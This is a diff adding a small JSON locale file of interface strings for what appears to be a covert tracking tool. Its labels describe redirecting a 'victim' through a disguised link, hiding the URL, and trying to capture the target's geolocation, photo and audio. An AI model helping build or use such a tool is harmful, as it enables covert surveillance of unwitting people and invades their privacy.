@@ -1,1 +1,20 @@
-{}
+{
+  "tracking": {
+    "redirecting": "Redirecting..."
+  },
+  "form": {
+    "title": "Get Personal Data Right Now",
+    "options": "Options",
+    "begin": "Begin",
+    "fields": {
+      "email": "Email",
+      "your_email": "Your email",
+      "redirectUrl": "Redirect URL",
+      "redirectUrlExplicit": "Where to redirect your victim",
+      "hideAddress": "Hide URL address",
+      "askGeolocation": "Try to get geolocation",
+      "askVideo": "Try to take a photo",
+      "askAudio": "Try to record an audio"
+    }
+  }
+}
